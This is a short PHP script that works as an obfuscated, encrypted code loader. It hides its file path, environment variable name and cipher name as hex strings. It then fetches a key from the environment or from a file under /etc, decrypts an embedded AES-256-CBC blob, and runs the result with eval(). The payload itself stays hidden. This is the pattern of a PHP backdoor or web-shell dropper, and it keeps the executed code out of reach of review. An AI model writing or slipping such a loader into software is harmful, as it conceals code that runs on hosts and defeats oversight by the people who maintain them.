<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('jCqLaT4Bqo/e2dL2/BZ1SA==');

$c=base64_decode(

'lil6MfsRGgi8D8yc31fEPYI3+69uJoPyJoh/UCkVmuYSSFdbEOYy6k3HWAhi7IwkkVouu6pot7R8' .
'9+CDP4Hbgpkq//UiTUKcb4r75C5OcJpSErv/AnQhezcnjpxZkrlK9JzAg2zimKREPlilsAyWbrg8' .
'XAg6hvddueJVLEYXIDHHC/XRxU+Y3XcxG+LnSIQCvt04tdIlk7QbnVejGdFO8akuEnFQTyZKIiTY' .
'Wu8nb0VO2jjZyZCDmeJ+9CfvGzxwqxzfGKVL+ZXmiefoYH+ULDQ4RZ+dzuuqXXLqVhDRtLk/NuSj' .
'4waGiDHgRCORl/LU9CYOo99KbGz6jf+4rWZZZoJ9nUE/rUPUPb2pj/YqMGBofl+yoOF2x1g4MOFy' .
'lJolStyL5KE1eU5YL7ojF8s5WU9QZ4B8FxJFvfwaBRF/iVm27EaPzf3BU1FtZWAYBaRbgJipi21A' .
'qaF+ZeBmT6w7zgW6C5fn528Z7dAV7QleZqXUAEdWC9Vwlg1zoYGl29CJptJYS5VDNvXRvfxoOSsg' .
'WlkWTOUuqS7gHLm4lfiXfn0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

